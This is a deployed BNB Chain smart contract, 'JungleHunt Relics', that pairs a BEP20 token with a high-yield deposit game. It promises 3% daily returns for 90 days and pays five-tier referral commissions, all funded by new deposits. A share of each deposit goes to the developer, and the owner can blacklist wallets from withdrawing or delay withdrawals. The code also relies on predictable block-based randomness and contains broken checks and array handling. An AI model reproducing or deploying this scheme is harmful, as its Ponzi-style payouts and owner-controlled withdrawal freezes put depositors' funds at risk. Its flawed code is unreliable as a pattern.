/**
 *Submitted for verification at BscScan.com on 2022-07-15
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract JungleHunt is Context, Ownable, IBEP20 {
    using SafeMath for uint256;
	
	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
	
    address payable public dev;

    uint8 public isScheduled;
    uint8 public isDaily;
    uint256 private constant DAY = 24 hours;
    uint256 private numDays = 1;
    
    uint16 constant PERCENT_DIVIDER = 10000; 
    uint16[5] private ref_bonuses = [2000, 500, 300, 200, 100]; 

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public ref_bonus;
    uint256 public rand_bonus;    

    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 ref_bonus;  
        uint256 rand_bonus;  
        
        uint256 total_invested;
        uint256 total_reinvested;
        uint256 total_withdrawn;
        uint256 total_ref_bonus;
        uint256 total_rand_bonus;
        
        uint256 huntingLuck;
        uint40 lastWithdrawn;
        
        Deposit[] deposits;
        uint256[5] structure; 
        uint8[] boughtItems;
    }

    struct Member {
        string profileData;
        address[] invites;
    }

    mapping(address => Player) public players;
    mapping(address => Member) public players2;
    
    mapping(uint256 => Tarif) public tarifs;

    mapping(uint256 => address) private members;
    uint private nextMemberNo;

    mapping(address => bool) private isBlacklisted;
    uint256 constant BUYRATE = 30000;
    uint256 constant POOLRATE = 10000;
    
    constructor() {
		dev = payable(msg.sender);		
	    _name = "JungleHunt Relics";
        _symbol = "RELICS";
        _decimals = 18;
        _totalSupply =  10_000_000_000 * 10**uint(_decimals); // 10B
        _balances[address(this)] = 9_000_000_000 * 10**uint(_decimals); 
		emit Transfer(address(0), address(this), _balances[address(this)]);    
		_balances[msg.sender] = 1_000_000_000 * 10**uint(_decimals); 
		emit Transfer(address(0), msg.sender, _balances[msg.sender]);    
		
        tarifs[90] = Tarif(90, 270); //3% daily for 90 days => 270% ROI     
    }

    receive() payable external {
        BuyItem(1);
    }

    fallback() payable external {
        BuyItem(1);
    }

    function transferTokens(address _from, address _to, uint256 amount) private {
        _balances[_to] = _balances[_to].add(amount);
        _balances[_from] = _balances[_from].sub(amount);
        emit Transfer(_from, _to, amount);
    }

    function BuyItem(uint8 itemno) public payable {
        
        require(msg.value >= 0.1 ether, "Minimum Buy is 0.1 BNB");

        uint256 tokens = msg.value.mul(BUYRATE);
        require(_balances[address(this)].sub(tokens) >= 0,"Not enough relics!");

        transferTokens(address(this), msg.sender, tokens);
	    
        uint256 shares1 = SafeMath.div(msg.value,5);
        uint256 shares2 = SafeMath.div(msg.value,3);
        payable(dev).transfer(shares1); 
        withdrawn += shares1;

        players[msg.sender].boughtItems.push(itemno);

        Player storage player = players[msg.sender];
        player.huntingLuck = player.huntingLuck + msg.value.div(0.1 ether);
        
        //distribute 30% Token Purchase Commission randomly
        if(nextMemberNo > 5){
            uint256 startno = this.rand(nextMemberNo-5);

            uint256 tokenSum;
                    
            for(uint256 i = startno; i < startno+5; i++) {
                tokenSum = tokenSum + _balances[members[i]];
            }

            //shares2 = shares2 * 3;
            rand_bonus += shares2;
            withdrawn += shares2;	

            uint256 shares3;
            for(uint256 i = startno; i < startno+5; i++) {
                shares3 = SafeMath.div(SafeMath.mul(shares2, _balances[members[i]]), tokenSum);
                payable(members[i]).transfer(shares3); 
                players[members[i]].total_rand_bonus += shares3;
            }

        }

     }

    function HuntRelics(address referral) public payable {
        
        require(msg.value >= 0.025 ether, "Minimum Buy is 0.025 BNB");

        uint256 tokens = msg.value.mul(POOLRATE);
        require(_balances[address(this)].sub(tokens) >= 0,"Not enough relics!");
        
        transferTokens(address(this), msg.sender, tokens);

        setUpline(msg.sender, referral);

        Player storage player = players[msg.sender];

        if(player.deposits.length > 0)
        {
            player.huntingLuck = player.huntingLuck + msg.value.div(0.5 ether);        
        }

        player.deposits.push(Deposit({
            tarif: 90,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));  

        uint256 shares = SafeMath.div(msg.value,10); 
        payable(dev).transfer(shares); 
    
        player.total_invested += msg.value;
        
        invested += msg.value;
        withdrawn += shares;
        commissionPayouts(msg.sender, msg.value);
    }

    function setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {

            members[nextMemberNo] = _addr;
            nextMemberNo++;

            if(_balances[_upline] <= 0) {
                _upline = owner();
            }
           
            players[_addr].upline = _upline;
            players2[_upline].invites.push(_addr);

            for(uint8 i = 0; i < 5; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
          
        }
    }   
    
    function rand(uint256 max) public view returns(uint256)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp + block.difficulty +
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
            block.gaslimit + 
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +
            block.number
        )));
        return (seed - ((seed / max) * max));
    }
    
    function commissionPayouts(address _addr, uint256 _amount) private {

        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            //address payable addr = address(uint160(up));
            //addr.transfer(bonus);
            payable(up).transfer(bonus); 

            uint256 b = bonus.mul(POOLRATE);
            players[up].total_ref_bonus += b;

            ref_bonus += b;
            withdrawn += bonus;
			     
            up = players[up].upline;
        }
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, 
                                                            uint256 total_invested, 
                                                                uint256 total_withdrawn, 
                                                                    uint256 total_ref_bonus, 
                                                                        uint256 total_rand_bonus,                                                                     
                                                                        uint256[5] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.computePayout(_addr);

        for(uint8 i = 0; i < 5; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.ref_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_ref_bonus,
            player.total_rand_bonus,
            
            structure
        );
    }
   
    function userInfo2(address _addr) view external returns(address up, uint40 lastPayout, uint256 luck, string memory profile, uint256[] memory items)
    {
        Player storage player = players[_addr];
        Member storage member = players2[_addr];
        for(uint8 i = 0; i < player.boughtItems.length; i++) {
            items[i] = player.boughtItems[i];
        }
        return ( player.upline, player.lastWithdrawn, player.huntingLuck, member.profileData, items);
    }

    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * (tarif.percent + player.huntingLuck) / tarif.life_days / 8640000;
            }
        }
        return value;
    }

 
    function getPayout(address _addr) private {
        uint256 payout = this.computePayout(_addr);

        if(payout > 0) {
            players[_addr].lastWithdrawn = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
    
   

    function SpendLoots() external {
        require(!isBlacklisted[msg.sender], "Wallet address is blacklisted!");

        Player storage player = players[msg.sender];

        if(isScheduled == 1) {
            require (block.timestamp >= (player.lastWithdrawn + (DAY * numDays)), "Not due yet for next Sell Transaction!");
        }     

        getPayout(msg.sender);

        require(player.dividends > 0 || player.ref_bonus > 0 || player.rand_bonus > 0, "No Income Dividends Yet!");

        uint256 amount = player.dividends + player.ref_bonus + player.rand_bonus;
	
        player.dividends = 0;
        player.ref_bonus = 0;
        player.rand_bonus = 0;
   
        player.total_withdrawn += amount;
        
        uint256 deduction = SafeMath.div(amount,10);
        uint to_receive = SafeMath.sub(amount, deduction); 
        payable(msg.sender).transfer(to_receive);
        
        withdrawn += amount;
               
        //distribute 10% deducted
        if(nextMemberNo > 5){
            uint256 startno = this.rand(SafeMath.sub(nextMemberNo,5));

            uint256 tokenSum;
                    
            for(uint256 i = startno; i < startno+5; i++) {
                tokenSum = SafeMath.add(tokenSum, _balances[members[i]]);
            }

            uint256 shares;
            for(uint256 i = startno; i < startno+5; i++) {
                shares = SafeMath.div(SafeMath.mul(deduction, _balances[members[i]]), tokenSum);
                payable(members[i]).transfer(shares); 
                players[members[i]].total_rand_bonus += shares;
            }

        }    

    }

    function nextWithdraw(address _addr) view external returns(uint40 next_sked) {
        Player storage player = players[_addr];
        if(player.deposits.length > 0)
        {
          return uint40(player.lastWithdrawn + (DAY * numDays));
        }
        return 0;
    }

    function SellRelics(uint256 amount) external {       
        Player storage player = players[msg.sender];    
        require(_balances[msg.sender] - amount >= 0,"Not enough relics!");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[address(this)] = _balances[address(this)].add(amount);
        emit Transfer(msg.sender, address(this), amount);
        
        uint256 bnb = amount.div(POOLRATE); 
        payable(msg.sender).transfer(bnb); 
        withdrawn += bnb;
        player.total_withdrawn += bnb;
    }
    
    function runBonus(uint startno, uint256 count) public payable {   
        
        uint256 tokenSum;
        for(uint256 i = startno; i < startno+count; i++) {
            tokenSum = SafeMath.add(tokenSum, _balances[members[i]]);
        }

        uint256 shares;
        for(uint256 i = startno; i < startno+count; i++) {
            shares = SafeMath.div(SafeMath.mul(msg.value, _balances[members[i]]), tokenSum);
            payable(members[i]).transfer(shares); 
                 
            players[members[i]].total_rand_bonus += shares;
        }
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function setProfile(string memory data) public returns (bool success) {
        players2[msg.sender].profileData = data;
        return true;
    }
    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }
    
    function setScheduled(uint8 newval) public onlyOwner returns (bool success) {
        isScheduled = newval;
        return true;
    }   
   
    function setDays(uint newval) public onlyOwner returns (bool success) {
        numDays = newval;
        return true;
    }
    
    function setBlackListed(address _addr) public onlyOwner returns (bool success) {
        isBlacklisted[_addr] = !isBlacklisted[_addr];
        return true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}